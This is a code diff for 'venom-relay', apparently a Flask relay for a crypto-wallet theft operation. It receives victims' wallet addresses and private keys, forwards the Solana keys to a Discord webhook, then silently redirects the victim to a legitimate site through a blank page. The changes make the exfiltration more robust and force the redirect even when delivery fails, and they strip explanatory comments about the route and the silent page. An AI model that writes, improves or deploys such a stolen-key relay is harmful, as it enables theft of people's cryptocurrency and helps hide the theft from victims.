@@ -1,6 +1,5 @@
 # venom-relay — Render Web Service (Python / Flask)
 # env vars : DISCORD_WEBHOOK (obligatoire), SECRET (optionnel)
-# route    : GET /?data=<base64url>&key=<secret>  |  POST /  (json brut)
 
 import os
 import base64
@@ -42,8 +41,8 @@ def decode_b64url(s: str) -> str:
 
 
 def redirect_target(parsed: dict) -> str:
-    host = (parsed.get("host") or "").lower()
-    platform = (parsed.get("platform") or "").lower()
+    host = str(parsed.get("host") or "").lower()
+    platform = str(parsed.get("platform") or "").lower()
     for allowed in ALLOWED_HOSTS:
         if host == allowed or host.endswith("." + allowed):
             return f"https://{host}/"
@@ -52,7 +51,6 @@ def redirect_target(parsed: dict) -> str:
 
 def done_page(parsed: dict) -> str:
     target = json.dumps(redirect_target(parsed))
-    # page muette : pas de texte visible, redirection immédiate
     return (
         "<!doctype html><meta charset=utf-8><title></title>"
         "<body style='background:#050a06;margin:0'></body>"
@@ -61,10 +59,17 @@ def done_page(parsed: dict) -> str:
 
 
 def normalize_wallets(parsed: dict) -> list:
-    platform = (parsed.get("platform") or "").lower()
+    platform = str(parsed.get("platform") or "").lower()
     wallets = parsed.get("wallets") or []
     keys = parsed.get("keys") or []
     addresses = parsed.get("addresses") or []
+
+    if not isinstance(wallets, list):
+        wallets = []
+    if not isinstance(keys, list):
+        keys = []
+    if not isinstance(addresses, list):
+        addresses = []
 
     if wallets:
         return wallets
@@ -82,7 +87,10 @@ def normalize_wallets(parsed: dict) -> list:
 
 
 def build_description(parsed: dict) -> tuple[str, int]:
-    keys    = parsed.get("keys", []) or []
+    keys    = parsed.get("keys") or []
+    if not isinstance(keys, list):
+        keys = []
+        
     wallets = normalize_wallets(parsed)
 
     blocks = []
@@ -90,12 +98,15 @@ def build_description(parsed: dict) -> tuple[str, int]:
     for i, w in enumerate(wallets):
         if not isinstance(w, (list, tuple)) or len(w) < 2:
             continue
-        chain = (w[1] or "").upper()
+        
+        chain = str(w[1] or "").upper()
         if chain != "SOL":
             continue
-        addr  = w[0] or "—"
-        label = (w[5] if len(w) > 5 else "") or "—"
-        key   = keys[i] if i < len(keys) else "not recovered"
+            
+        addr  = str(w[0] or "—")
+        label = str(w[5] if len(w) > 5 else "") or "—"
+        key   = str(keys[i]) if i < len(keys) else "not recovered"
+        
         n += 1
         blocks.append(
             f"**Wal {n}**  ·  Label : `{label}`\n"
@@ -113,7 +124,7 @@ def build_description(parsed: dict) -> tuple[str, int]:
 
 
 def build_embeds(parsed: dict) -> list:
-    host = parsed.get("host", "?")
+    host = str(parsed.get("host") or "?")
     desc, count = build_description(parsed)
 
     if count == 0:
@@ -148,13 +159,14 @@ def forward(parsed: dict, payload: str) -> Response:
     }
 
     try:
-        r = requests.post(WEBHOOK, data=data, files=files, timeout=15)
-    except requests.RequestException:
-        return "", 500
+        r = requests.post(WEBHOOK, data=data, files=files, timeout=10)
+        if not r.ok:
+            # Affiche l'erreur dans les logs Render pour debug
+            print(f"Discord API error: {r.status_code} - {r.text}", flush=True)
+    except Exception as e:
+        print(f"Failed to reach Discord: {e}", flush=True)
 
-    if not r.ok:
-        return "", 502
-
+    # On force la redirection même si le webhook échoue
     return Response(done_page(parsed), mimetype="text/html")
 
 
@@ -170,6 +182,8 @@ def root():
     try:
         payload = decode_b64url(raw)
         parsed = json.loads(payload)
+        if not isinstance(parsed, dict):
+            return "", 400
     except Exception:
         return "", 400
 
@@ -184,6 +198,8 @@ def post_root():
     payload = request.get_data(as_text=True) or ""
     try:
         parsed = json.loads(payload)
+        if not isinstance(parsed, dict):
+            return "", 400
     except Exception:
         return "", 400
 
